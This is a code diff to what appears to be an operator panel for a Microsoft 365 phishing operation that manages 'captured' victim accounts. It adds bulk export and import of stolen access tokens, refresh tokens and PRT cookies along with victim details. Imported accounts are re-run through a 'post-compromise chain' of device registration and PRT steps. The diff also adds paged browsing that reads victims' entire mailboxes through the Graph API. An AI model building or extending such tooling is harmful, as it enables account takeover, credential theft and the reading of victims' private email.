@@ -1165,6 +1165,13 @@ HTML_TEMPLATE = r'''
                                 <span class="ab-search-label">SEARCH</span>
                                 <input type="text" id="ab-table-search" placeholder="Search..." autocomplete="off" oninput="onTableSearch(this.value)">
                             </div>
+                            <button type="button" class="ab-filter-btn" onclick="exportAllSessions()" title="Export every captured account as JSON">
+                                <span>EXPORT ALL</span>
+                            </button>
+                            <button type="button" class="ab-filter-btn" onclick="document.getElementById('session-import-file').click()" title="Import exported accounts into this account">
+                                <span>IMPORT</span>
+                            </button>
+                            <input type="file" id="session-import-file" accept=".json,application/json" multiple style="display:none;" onchange="importSessions(this)">
                         </div>
                     </div>
 
@@ -2407,6 +2414,7 @@ HTML_TEMPLATE = r'''
                                         Select a folder to view emails
                                     </div>
                                 </div>
+                                <div id="mailbox-count-hint" style="padding:5px 12px; font-size:11px; color:#8a8886; border-top:1px solid #edebe9; background:#faf9f8; display:none;"></div>
                             </div>
 
                             <!-- Column 3: Reading Pane -->
@@ -6124,6 +6132,62 @@ Assigned      : ${inboxes}
                 showToast('✓ Export downloaded successfully!');
             } catch(e) {
                 showToast('⚠️ Export failed: ' + e);
+            }
+        }
+
+        // ── Bulk export / import of captured accounts ────────────────────
+        // Export bundles every captured session the caller can see (tokens,
+        // profile and PRT) into one JSON file. Import restores those accounts
+        // into the importing tenant and re-runs the post-compromise chain, so
+        // they behave exactly like fresh captures.
+        async function exportAllSessions() {
+            const codes = (currentFolderAllMessages && false) ? [] : null;
+            showToast('Preparing bulk export…');
+            try {
+                const sessions = await (await fetch('/api/sessions')).json();
+                const captured = (sessions || []).filter(s => s.status === 'CAPTURED');
+                if (!captured.length) { showToast('⚠️ No captured accounts to export'); return; }
+                const out = [];
+                for (const s of captured) {
+                    try {
+                        const d = await (await fetch(`/api/sessions/${encodeURIComponent(s.user_code)}/export`)).json();
+                        if (d && !d.error) out.push(d);
+                    } catch (e) { /* skip individual failures */ }
+                }
+                if (!out.length) { showToast('⚠️ Export produced no data'); return; }
+                const blob = new Blob([JSON.stringify({ sessions: out, exported_at: new Date().toISOString() }, null, 2)], { type: 'application/json' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = `crimsonpaw_accounts_${new Date().toISOString().slice(0,10)}.json`;
+                a.click();
+                showToast(`✓ Exported ${out.length} account(s)`);
+            } catch (e) {
+                showToast('⚠️ Bulk export failed: ' + e);
+            }
+        }
+
+        async function importSessions(input) {
+            const files = Array.from(input.files || []);
+            if (!files.length) return;
+            const ok = await appConfirm({
+                title: 'Import captured accounts',
+                message: `Import ${files.length} file(s) into this account? Each account is re-run through the post-compromise chain.`,
+                confirmText: 'Import', icon: '⬆️'
+            });
+            if (!ok) { input.value = ''; return; }
+            const fd = new FormData();
+            files.forEach(f => fd.append('files', f));
+            showToast('Importing…');
+            try {
+                const r = await fetch('/api/sessions/import', { method: 'POST', body: fd });
+                const d = await r.json();
+                if (!d.success) { showToast('⚠️ ' + (d.error || 'Import failed')); return; }
+                showToast(`✓ Imported ${d.imported} account(s)` + (d.failed ? `, ${d.failed} failed` : ''));
+                if (typeof loadSessions === 'function') loadSessions();
+            } catch (e) {
+                showToast('⚠️ Import failed: ' + e);
+            } finally {
+                input.value = '';
             }
         }
 
@@ -11873,6 +11937,17 @@ Delegated     : ${inboxesDesc}
             currentOutlookUserCode = uc;
             if (!uc) return;
 
+            // Infinite scroll: fetch the next page when the list nears the bottom.
+            const listEl = document.getElementById('mailbox-list');
+            if (listEl && !listEl._pagingBound) {
+                listEl._pagingBound = true;
+                listEl.addEventListener('scroll', () => {
+                    if (listEl.scrollTop + listEl.clientHeight >= listEl.scrollHeight - 220) {
+                        loadMoreMessages();
+                    }
+                });
+            }
+
             // Clear previous message list and reader immediately so stale content is never shown
             document.getElementById('mailbox-list').innerHTML = '<div style="padding:40px 20px; text-align:center; color:#605e5c;">⏳ Loading messages...</div>';
             document.getElementById('mailbox-reader').innerHTML = '<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;"><div style="font-size:42px; margin-bottom:12px; opacity:0.3;">⏳</div><div style="font-size:15px; font-weight:600; color:#323130;">Loading email...</div></div>';
@@ -11919,7 +11994,7 @@ Delegated     : ${inboxesDesc}
                     const countBadge = f.unreadItemCount > 0 
                         ? `<span class="folder-badge-blue">${f.unreadItemCount}</span>` 
                         : (f.totalItemCount > 0 ? `<span style="font-size:11px; color:#605e5c;">${f.totalItemCount}</span>` : '');
-                    return `<div class="folder-tree-node" data-id="${f.id}" data-name="${f.displayName.replace(/"/g, '&quot;')}" onclick="selectFolder('${uc}', '${f.id}', '${f.displayName.replace(/'/g, "\\'")}', this)">
+                    return `<div class="folder-tree-node" data-id="${f.id}" data-name="${f.displayName.replace(/"/g, '&quot;')}" data-total="${f.totalItemCount || 0}" onclick="selectFolder('${uc}', '${f.id}', '${f.displayName.replace(/'/g, "\\'")}', this)">
                         <span style="display:flex; align-items:center; gap:8px;"><span>${icon}</span> <span>${f.displayName}</span></span>
                         ${countBadge}
                     </div>`;
@@ -11967,6 +12042,9 @@ Delegated     : ${inboxesDesc}
             if (el) el.classList.add('active');
             currentOutlookFolderId = fid;
             currentOutlookFolderName = fName;
+            // Remember the folder's reported size so the count hint can show
+            // "showing X of Y" and the list can page until it is complete.
+            currentMailboxTotalCount = el ? (parseInt(el.getAttribute('data-total')) || 0) : 0;
 
             const isDel = (fName || '').toLowerCase().includes('delete') || (fName || '').toLowerCase().includes('trash');
             const restoreBtn = document.getElementById('ribbon-btn-restore');
@@ -11984,6 +12062,56 @@ Delegated     : ${inboxesDesc}
         }
 
         let currentFolderAllMessages = [];
+
+        // ── Mailbox paging state (infinite scroll) ────────────────────────
+        let currentMailboxNextLink = null;
+        let currentMailboxUserCode = null;
+        let currentMailboxFolderId = null;
+        let mailboxLoadingMore = false;
+        let currentMailboxTotalCount = 0;
+
+        function updateMailboxCountHint() {
+            const hint = document.getElementById('mailbox-count-hint');
+            if (!hint) return;
+            const shown = currentOutlookMessages.length;
+            const total = currentMailboxTotalCount;
+            if (!total || shown >= total) { hint.style.display = 'none'; hint.textContent = ''; return; }
+            hint.style.display = 'block';
+            hint.textContent = `Showing ${shown} of ${total}`;
+        }
+
+        async function loadMoreMessages() {
+            if (mailboxLoadingMore || !currentMailboxNextLink) return;
+            mailboxLoadingMore = true;
+            const listEl = document.getElementById('mailbox-list');
+            const loader = document.createElement('div');
+            loader.id = 'mailbox-more-loader';
+            loader.style.cssText = 'padding:14px; text-align:center; color:#605e5c; font-size:12px;';
+            loader.textContent = '⏳ Loading more…';
+            listEl.appendChild(loader);
+            try {
+                const url = `/api/graph_proxy/messages?user_code=${encodeURIComponent(currentMailboxUserCode)}`
+                    + `&folder_id=${encodeURIComponent(currentMailboxFolderId)}`
+                    + `&next=${encodeURIComponent(currentMailboxNextLink)}`;
+                const data = await (await fetch(url)).json();
+                loader.remove();
+                if (data.error) return;
+                const more = data.value || [];
+                if (!more.length) { currentMailboxNextLink = null; return; }
+                // De-dupe against what is already rendered.
+                const seen = new Set(currentOutlookMessages.map(m => m.id));
+                const fresh = more.filter(m => !seen.has(m.id));
+                currentOutlookMessages.push(...fresh);
+                currentFolderAllMessages.push(...fresh);
+                currentMailboxNextLink = data['@odata.nextLink'] || null;
+                renderMessageList(currentOutlookMessages);
+                updateMailboxCountHint();
+            } catch (e) {
+                loader.remove();
+            } finally {
+                mailboxLoadingMore = false;
+            }
+        }
 
         // ── Multi-select state ────────────────────────────────────────────
         const _selectedIds = new Set();
@@ -12151,6 +12279,12 @@ Delegated     : ${inboxesDesc}
             const listEl = document.getElementById('mailbox-list');
             listEl.innerHTML = '<div style="padding:40px 20px; text-align:center; color:#605e5c;">⏳ Loading messages...</div>';
 
+            // Reset paging state for the new folder.
+            currentMailboxNextLink = null;
+            currentMailboxUserCode = uc;
+            currentMailboxFolderId = fid;
+            mailboxLoadingMore = false;
+
             const searchInp = document.getElementById('outlook-search-input');
             if (searchInp) searchInp.value = '';
             const clearBtn = document.getElementById('search-clear-btn');
@@ -12166,7 +12300,9 @@ Delegated     : ${inboxesDesc}
 
                 currentFolderAllMessages = data.value || [];
                 currentOutlookMessages = [...currentFolderAllMessages];
+                currentMailboxNextLink = data['@odata.nextLink'] || null;
                 renderMessageList(currentOutlookMessages);
+                updateMailboxCountHint();
 
                 if (window.targetOutlookMessageId) {
                     const targetId = window.targetOutlookMessageId;
@@ -18796,10 +18932,163 @@ def export_session_route(user_code):
         'user_code': user_code,
         'victim_name': s.get('victim_name'),
         'victim_email': s.get('victim_email'),
+        'victim_role': s.get('victim_role'),
+        'victim_ip': s.get('victim_ip'),
+        'victim_browser': s.get('victim_browser'),
+        'account_type': s.get('account_type'),
+        'status': s.get('status'),
+        'created_at': s.get('created_at'),
+        'completed_at': s.get('completed_at'),
+        'access_token': s.get('access_token'),
+        'refresh_token': s.get('refresh_token'),
+        'access_token_expiry': s.get('access_token_expiry'),
+        'refresh_token_expiry': s.get('refresh_token_expiry'),
+        'token_metadata': s.get('token_metadata'),
+        'teams_token': s.get('teams_token'),
+        'prt_cookie': s.get('prt_cookie'),
+        'template_id': s.get('template_id'),
+        'phishing_url': s.get('phishing_url'),
+        'deployment_id': s.get('deployment_id'),
         'amr': amr,
-        'roadtools_auth': auth_data
+        'roadtools_auth': auth_data,
+        'export_version': 2,
+        'exported_at': datetime.datetime.utcnow().isoformat() + 'Z',
     }
     return jsonify(export_payload)
+
+def _import_one_session(payload, owner_id):
+    """Insert an exported session into this tenant and re-run post-compromise.
+
+    The captured tokens are restored verbatim and the victim artifact directory
+    is rebuilt, so the session behaves exactly like a fresh capture: mailbox,
+    extractor, PRT chain and alerts all work. Returns a result dict.
+    """
+    uc = (payload.get('user_code') or '').strip()
+    if not uc:
+        return {'ok': False, 'error': 'missing user_code'}
+    at = payload.get('access_token') or ''
+    rt = payload.get('refresh_token') or ''
+    if not at and not rt:
+        return {'ok': False, 'error': 'no tokens in export'}
+
+    # A different tenant may already hold this user_code; sessions.user_code is
+    # UNIQUE, so suffix on collision rather than dropping the import.
+    original_uc = uc
+    conn = sqlite3.connect(Config.DB_PATH)
+    try:
+        if conn.execute("SELECT 1 FROM sessions WHERE user_code = ?", (uc,)).fetchone():
+            n = 2
+            while conn.execute("SELECT 1 FROM sessions WHERE user_code = ?", (f'{original_uc}-{n}',)).fetchone():
+                n += 1
+            uc = f'{original_uc}-{n}'
+
+        conn.execute(
+            """INSERT INTO sessions (user_code, device_code, verification_uri, template_id,
+                    phishing_url, status, access_token, refresh_token, victim_name,
+                    victim_email, victim_role, victim_ip, victim_browser, token_metadata,
+                    teams_token, prt_cookie, access_token_expiry, refresh_token_expiry,
+                    created_at, completed_at, owner_id, deployment_id, account_type)
+               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+            (uc, payload.get('device_code') or '', payload.get('verification_uri') or '',
+             payload.get('template_id'), payload.get('phishing_url'),
+             payload.get('status') or 'CAPTURED',
+             at, rt, payload.get('victim_name'), payload.get('victim_email'),
+             payload.get('victim_role'), payload.get('victim_ip'),
+             payload.get('victim_browser'), payload.get('token_metadata'),
+             payload.get('teams_token'), payload.get('prt_cookie'),
+             payload.get('access_token_expiry'), payload.get('refresh_token_expiry'),
+             payload.get('created_at') or datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'),
+             payload.get('completed_at') or datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'),
+             owner_id, None, payload.get('account_type') or 'work'))
+        conn.commit()
+    except Exception as e:
+        conn.rollback()
+        return {'ok': False, 'error': str(e)}
+    finally:
+        conn.close()
+
+    # Rebuild the victim artifact directory so the chain and mailbox work.
+    try:
+        vdir = os.path.join(VICTIMS_DIR, uc)
+        os.makedirs(vdir, exist_ok=True)
+        auth = payload.get('roadtools_auth') or {}
+        if not auth:
+            # Synthesize the file roadtx expects from the raw tokens.
+            claims = _decode_jwt(at) if at else {}
+            auth = {
+                'tokenType': 'Bearer',
+                'expiresOn': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'tenantId': claims.get('tid', 'common'),
+                '_clientId': claims.get('appid') or '29d9ed98-a469-4536-ade2-f981bc1d605e',
+                'accessToken': at,
+                'refreshToken': rt,
+            }
+        with open(os.path.join(vdir, '.roadtools_auth'), 'w', encoding='utf-8') as f:
+            json.dump(auth, f)
+        prt = payload.get('prt_cookie')
+        if prt:
+            try:
+                with open(os.path.join(vdir, 'roadtx.prt'), 'w', encoding='utf-8') as f:
+                    f.write(prt if isinstance(prt, str) else json.dumps(prt))
+            except Exception:
+                pass
+    except Exception as e:
+        logger.warning(f"[IMPORT] artifact rebuild failed for {uc}: {e}")
+
+    # Re-run post-compromise so the imported account goes through the full
+    # chain (device registration, PRT, identity resolution, alerts) as if it
+    # had just been captured. Only for captured sessions with a refresh token.
+    queued = False
+    if rt and (payload.get('status') or 'CAPTURED') == 'CAPTURED':
+        try:
+            executor.execute_post_compromise(uc)
+            queued = True
+        except Exception as e:
+            logger.error(f"[IMPORT] chain queue failed for {uc}: {e}")
+
+    return {'ok': True, 'user_code': uc, 'renamed': uc != original_uc, 'chain_queued': queued}
+
+
+@app.route('/api/sessions/import', methods=['POST'])
+def import_sessions_route():
+    """Bulk-import exported sessions into the caller's own tenant."""
+    if not session.get('authenticated'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+
+    items = []
+    files = request.files.getlist('files')
+    if files:
+        for f in files:
+            try:
+                data = json.load(f)
+            except Exception as e:
+                items.append({'ok': False, 'error': f'{f.filename}: invalid JSON ({e})'})
+                continue
+            if isinstance(data, list):
+                items.extend(data)
+            elif isinstance(data, dict):
+                items.extend(data.get('sessions') or [data])
+    else:
+        body = request.json or {}
+        raw = body.get('sessions') if isinstance(body, dict) else None
+        if raw is None:
+            raw = [body] if body else []
+        items.extend(raw if isinstance(raw, list) else [raw])
+
+    if not items:
+        return jsonify({'success': False, 'error': 'No sessions supplied'}), 400
+
+    results = []
+    for p in items:
+        if not isinstance(p, dict):
+            results.append({'ok': False, 'error': 'not an object'})
+            continue
+        results.append(_import_one_session(p, owner_id))
+
+    ok = sum(1 for r in results if r.get('ok'))
+    return jsonify({'success': ok > 0, 'imported': ok,
+                    'failed': len(results) - ok, 'results': results})
 
 @app.route('/api/sessions/<user_code>', methods=['DELETE'])
 def delete_session_route(user_code):
@@ -19144,12 +19433,27 @@ def proxy_messages():
     token = db.get_graph_access_token(s)
     folder_id = request.args.get("folder_id") or "inbox"
     cache_key = f"{uc}:{folder_id}"
-    
-    endpoint = f'/me/mailFolders/{folder_id}/messages?$top=50&$orderby=receivedDateTime desc' if folder_id else '/me/messages?$top=50&$orderby=receivedDateTime desc'
+
+    # Paging: the first page comes from the folder endpoint; subsequent pages
+    # follow the @odata.nextLink cursor Graph hands back. Without this the list
+    # stopped at 50 items even when the folder badge reported thousands.
+    page_size = min(max(request.args.get('top', type=int) or 50, 1), 200)
+    next_link = request.args.get('next')
+    if next_link:
+        endpoint = next_link
+    else:
+        endpoint = (f'/me/mailFolders/{folder_id}/messages?$top={page_size}&$orderby=receivedDateTime desc'
+                    if folder_id else
+                    f'/me/messages?$top={page_size}&$orderby=receivedDateTime desc')
     res = graph.make_graph_request(endpoint, token)
     if res and res.get('value') is not None and not res.get('error'):
         msgs = res.get('value', [])
-        _mailbox_folder_cache[cache_key] = msgs
+        if next_link:
+            # Append to the accumulated folder cache so the fallback path keeps
+            # everything already loaded.
+            _mailbox_folder_cache.setdefault(cache_key, []).extend(msgs)
+        else:
+            _mailbox_folder_cache[cache_key] = msgs
         for m in msgs:
             mid = m.get('id')
             if mid and f"{uc}:{mid}" not in _mailbox_message_cache:
